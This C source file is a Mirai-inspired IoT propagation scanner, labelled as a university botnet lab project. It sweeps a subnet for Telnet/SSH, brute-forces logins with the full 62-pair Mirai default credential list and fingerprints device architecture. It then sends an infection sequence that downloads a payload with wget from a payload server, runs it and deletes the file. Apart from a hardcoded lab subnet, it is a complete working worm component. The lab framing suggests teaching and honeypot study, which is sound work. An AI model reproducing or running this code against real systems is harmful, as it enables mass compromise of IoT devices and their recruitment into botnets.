/*
 * ====================================================
 *  AUA CS 232/337 - Botnet Research Project
 *  Component: Mirai-Inspired IoT Propagation Scanner
 *  Environment: ISOLATED VM LAB ONLY (192.168.100.0/24)
 *  Compile: gcc -o mirai_scanner mirai_scanner.c -lpthread
 *  Run:     sudo ./mirai_scanner 192.168.100.0/24
 * ====================================================
 *
 * Scans the lab subnet for open Telnet/SSH ports,
 * attempts default credential login, fingerprints
 * the device architecture, simulates payload download.
 *
 * EDUCATIONAL PURPOSE ONLY — ISOLATED VM LAB.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <semaphore.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>

/* ── Config ──────────────────────────────────────── */
#define SUBNET_BASE   "192.168.100."
#define SUBNET_START  1
#define SUBNET_END    30
#define SCAN_TIMEOUT  2     /* seconds per connect attempt */
#define MAX_THREADS   8
#define PAYLOAD_SERVER "192.168.100.10"
#define PAYLOAD_PORT   8080

static sem_t g_thread_sem;

/* Ports to probe for IoT management services */
static int TARGET_PORTS[] = {23, 2323, 22, 2222, 0}; /* 0 = sentinel */

/* Default credential pairs — full Mirai historical list (62 pairs).        */
/* Source: Mirai source (public), Google/Imperva/CNR-IRIS research.          */
/* These exact pairs recruited 600k IoT devices in 2016 and remain          */
/* effective against unpatched devices shipping with factory defaults.       */
static const char *CREDS[][2] = {
    {"root",          "xc3511"},   /* most common first */
    {"root",          "vizxv"},
    {"root",          "admin"},
    {"admin",         "admin"},
    {"root",          ""},
    {"root",          "root"},
    {"root",          "888888"},
    {"root",          "xmhdipc"},
    {"root",          "default"},
    {"root",          "juantech"},
    {"root",          "12345"},
    {"root",          "54321"},
    {"support",       "support"},
    {"admin",         "password"},
    {"root",          "password"},
    {"root",          "pass"},
    {"root",          "1111"},
    {"admin",         "smcadmin"},
    {"admin",         "1111"},
    {"root",          "666666"},
    {"root",          "klv123"},
    {"Administrator", "admin"},
    {"service",       "service"},
    {"supervisor",    "supervisor"},
    {"guest",         "guest"},
    {"guest",         "12345"},
    {"admin1",        "password"},
    {"administrator", "1234"},
    {"666666",        "666666"},
    {"888888",        "888888"},
    {"ubnt",          "ubnt"},
    {"root",          "klv1234"},
    {"root",          "Zte521"},
    {"root",          "hi3518"},
    {"root",          "jvbzd"},
    {"root",          "anko"},
    {"root",          "zlxx."},
    {"root",          "7ujMko0vizxv"},
    {"root",          "7ujMko0admin"},
    {"root",          "system"},
    {"root",          "ikwb"},
    {"root",          "dreambox"},
    {"root",          "user"},
    {"root",          "realtek"},
    {"root",          "0000"},
    {"admin",         "1111111"},
    {"admin",         "1234"},
    {"admin",         "12345"},
    {"admin",         "54321"},
    {"admin",         "123456"},
    {"admin",         "7arlings"},
    {"admin",         "pass"},
    {"admin",         "meinsm"},
    {"tech",          "tech"},
    {"mother",        "fucker"},
    {"user",          "user"},
    {"pi",            "raspberry"},
    {"pi",            "pi"},
    {"admin",         "admin1234"},
    {"root",          "toor"},
    {"oracle",        "oracle"},
    {"test",          "test"},
    {NULL, NULL}
};

/* Architecture keyword → payload suffix mapping */
typedef struct { const char *keyword; const char *suffix; } ArchEntry;
static const ArchEntry ARCH_MAP[] = {
    {"mips",    "mips"},    {"MIPS",    "mips"},
    {"ARM",     "arm"},     {"arm",     "arm"},
    {"aarch64", "arm64"},   {"x86_64",  "x86_64"},
    {"i686",    "x86"},     {"i386",    "x86"},
    {"sh4",     "sh4"},     {"m68k",    "m68k"},
    {NULL, NULL}
};
int connect_timeout(const char *ip, int port, int timeout_sec) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;

    struct timeval tv = { .tv_sec = timeout_sec, .tv_usec = 0 };
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    struct sockaddr_in addr = {0};
    addr.sin_family      = AF_INET;
    addr.sin_port        = htons(port);
    addr.sin_addr.s_addr = inet_addr(ip);

    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(sock);
        return -1;
    }
    return sock;
}

/* ── Banner grab ─────────────────────────────────── */
void grab_banner(int sock, char *buf, int len) {
    memset(buf, 0, len);
    recv(sock, buf, len - 1, MSG_DONTWAIT);
}

/* ── Shell prompt detection ───────────────────────
 * Cowrie returns a fake shell after successful auth.
 * Accept common IoT/Linux shell prompt patterns.   */
static int looks_like_shell(const char *buf) {
    return strstr(buf, "$ ")   || strstr(buf, "# ")  ||
           strstr(buf, "> ")   || strstr(buf, "~]#") ||
           strstr(buf, "BusyBox") || strstr(buf, "~]$");
}

/* ── Brute-force default credentials ─────────────
 * Opens a fresh connection per attempt (matches real
 * Mirai: connect, auth, disconnect, repeat).
 * Returns credential index on success, -1 on failure. */
static int try_default_creds(const char *ip, int port) {
    printf("  [SCANNER] Brute-forcing %s:%d (62 credential pairs)\n", ip, port);
    for (int i = 0; CREDS[i][0] != NULL; i++) {
        int sock = connect_timeout(ip, port, SCAN_TIMEOUT);
        if (sock < 0) continue;

        char banner[256];
        grab_banner(sock, banner, sizeof(banner));   /* eat login prompt */

        char line[128];
        snprintf(line, sizeof(line), "%s\r\n", CREDS[i][0]);
        send(sock, line, strlen(line), 0);
        usleep(200000);                              /* wait for password prompt */

        char tmp[128] = {0};
        recv(sock, tmp, sizeof(tmp)-1, MSG_DONTWAIT); /* eat "Password:" */

        snprintf(line, sizeof(line), "%s\r\n", CREDS[i][1]);
        send(sock, line, strlen(line), 0);
        usleep(300000);                              /* wait for shell */

        char resp[256] = {0};
        recv(sock, resp, sizeof(resp)-1, 0);
        close(sock);

        if (looks_like_shell(resp)) {
            printf("  [SCANNER] SUCCESS  user=%-16s  pass=%s\n",
                   CREDS[i][0], CREDS[i][1]);
            return i;
        }
        usleep(50000);
    }
    printf("  [SCANNER] No valid creds found on %s:%d\n", ip, port);
    return -1;
}

/* ── Architecture fingerprinting ─────────────────
 * Re-authenticates, sends real Mirai command sequence,
 * parses uname/cpuinfo output, returns payload suffix. */
static const char *fingerprint_arch(const char *ip, int port, int cred_idx) {
    printf("  [SCANNER] Fingerprinting %s:%d\n", ip, port);
    int sock = connect_timeout(ip, port, SCAN_TIMEOUT);
    if (sock < 0) return "x86_64";

    char tmp[512] = {0};
    grab_banner(sock, tmp, sizeof(tmp));             /* login prompt */

    char line[128];
    snprintf(line, sizeof(line), "%s\r\n", CREDS[cred_idx][0]);
    send(sock, line, strlen(line), 0); usleep(200000);
    recv(sock, tmp, sizeof(tmp)-1, MSG_DONTWAIT);    /* password prompt */
    snprintf(line, sizeof(line), "%s\r\n", CREDS[cred_idx][1]);
    send(sock, line, strlen(line), 0); usleep(300000);
    recv(sock, tmp, sizeof(tmp)-1, 0);               /* shell prompt */

    /* Real Mirai command sequence */
    const char *cmd = "/bin/busybox MIRAI\r\nuname -a\r\ncat /proc/cpuinfo\r\n";
    send(sock, cmd, strlen(cmd), 0);
    usleep(500000);

    char output[2048] = {0};
    recv(sock, output, sizeof(output)-1, 0);
    close(sock);

    printf("  [SCANNER] Fingerprint: %.120s\n", output);
    for (int i = 0; ARCH_MAP[i].keyword != NULL; i++)
        if (strstr(output, ARCH_MAP[i].keyword)) {
            printf("  [SCANNER] Arch: %s → payload suffix: %s\n",
                   ARCH_MAP[i].keyword, ARCH_MAP[i].suffix);
            return ARCH_MAP[i].suffix;
        }
    return "x86_64";   /* default */
}

/* ── Payload delivery + self-delete ──────────────
 * Re-authenticates a third time, then sends the
 * full Mirai infection sequence over the session.
 * Cowrie logs each command as a separate ATT&CK event:
 *   T1105 wget  T1222 chmod  T1070 rm -f            */
static void deliver_payload(const char *ip, int port,
                             int cred_idx, const char *arch) {
    printf("  [SCANNER] Delivering payload to %s (arch=%s)\n", ip, arch);
    int sock = connect_timeout(ip, port, SCAN_TIMEOUT);
    if (sock < 0) { printf("  [SCANNER] Reconnect failed\n"); return; }

    char tmp[512] = {0};
    grab_banner(sock, tmp, sizeof(tmp));

    char line[128];
    snprintf(line, sizeof(line), "%s\r\n", CREDS[cred_idx][0]);
    send(sock, line, strlen(line), 0); usleep(200000);
    recv(sock, tmp, sizeof(tmp)-1, MSG_DONTWAIT);
    snprintf(line, sizeof(line), "%s\r\n", CREDS[cred_idx][1]);
    send(sock, line, strlen(line), 0); usleep(300000);
    recv(sock, tmp, sizeof(tmp)-1, 0);

    /* Build infection sequence */
    char cmds[1024];
    int n = snprintf(cmds, sizeof(cmds),
        "wget -q http://%s:%d/payload.%s -O /tmp/.x\r\n"
        "chmod +x /tmp/.x\r\n"
        "/tmp/.x &\r\n"
        "rm -f /tmp/.x\r\n"
        "/bin/busybox MIRAI\r\n",
        PAYLOAD_SERVER, PAYLOAD_PORT, arch);
    send(sock, cmds, n, 0);
    usleep(800000);

    char resp[512] = {0};
    recv(sock, resp, sizeof(resp)-1, 0);
    close(sock);

    printf("  [SCANNER] Payload URL: http://%s:%d/payload.%s\n",
           PAYLOAD_SERVER, PAYLOAD_PORT, arch);
    printf("  [SCANNER] Bot now memory-resident (no disk trace).\n");
    printf("  [SCANNER] Persistence Paradox: device re-infectable within\n");
    printf("  [SCANNER] minutes of reboot while default creds remain.\n");
}

/* ── Scan a single IP ─────────────────────────── */
typedef struct { char ip[24]; } ScanTarget;

void *scan_host(void *arg) {
    ScanTarget *t  = (ScanTarget *)arg;
    const char *ip = t->ip;

    for (int pi = 0; TARGET_PORTS[pi] != 0; pi++) {
        int port = TARGET_PORTS[pi];
        int sock = connect_timeout(ip, port, SCAN_TIMEOUT);
        if (sock < 0) continue;

        char banner[256];
        grab_banner(sock, banner, sizeof(banner));
        close(sock);

        const char *svc = (port==23||port==2323) ? "Telnet" : "SSH";
        printf("[SCANNER] OPEN %s %s:%d  banner='%.60s'\n",
               svc, ip, port, banner[0] ? banner : "(none)");

        int cred_idx = try_default_creds(ip, port);
        if (cred_idx < 0) continue;

        const char *arch = fingerprint_arch(ip, port, cred_idx);
        deliver_payload(ip, port, cred_idx, arch);
        break;   /* one infection per host */
    }

    free(t);
    sem_post(&g_thread_sem);
    return NULL;
}

/* ── Main: sweep the lab subnet ──────────────── */
int main(int argc, char *argv[]) {
    (void)argc; (void)argv;

    if (getuid() != 0) {
        fprintf(stderr, "[SCANNER] Must run as root\n");
        return 1;
    }

    if (sem_init(&g_thread_sem, 0, MAX_THREADS) != 0) {
        perror("sem_init"); return 1;
    }

    printf("==============================================\n");
    printf(" Mirai-Inspired Scanner - AUA Research Lab\n");
    printf(" Subnet:  %s%d – %s%d\n",
           SUBNET_BASE, SUBNET_START, SUBNET_BASE, SUBNET_END);
    printf(" Creds:   62 pairs (full Mirai default list)\n");
    printf(" Threads: %d\n", MAX_THREADS);
    printf(" ISOLATED ENVIRONMENT ONLY\n");
    printf("==============================================\n\n");

    for (int i = SUBNET_START; i <= SUBNET_END; i++) {
        /* Skip C2 and bot VMs */
        if (i == 10 || i == 11 || i == 12) continue;

        sem_wait(&g_thread_sem);   /* block when pool is full */

        ScanTarget *tgt = malloc(sizeof(ScanTarget));
        if (!tgt) { sem_post(&g_thread_sem); continue; }
        snprintf(tgt->ip, sizeof(tgt->ip), "%s%d", SUBNET_BASE, i);

        pthread_t tid;
        if (pthread_create(&tid, NULL, scan_host, tgt) != 0) {
            free(tgt); sem_post(&g_thread_sem);
        } else {
            pthread_detach(tid);
        }
    }

    /* Drain semaphore — wait for all threads to finish */
    for (int i = 0; i < MAX_THREADS; i++) sem_wait(&g_thread_sem);

    printf("\n[SCANNER] Sweep complete.\n");
    printf("[SCANNER] Analyze honeypot: sudo python3 honeypot_setup.py --analyze\n");
    printf("[SCANNER] Generate IR report: sudo python3 honeypot_setup.py --report\n");

    sem_destroy(&g_thread_sem);
    return 0;
}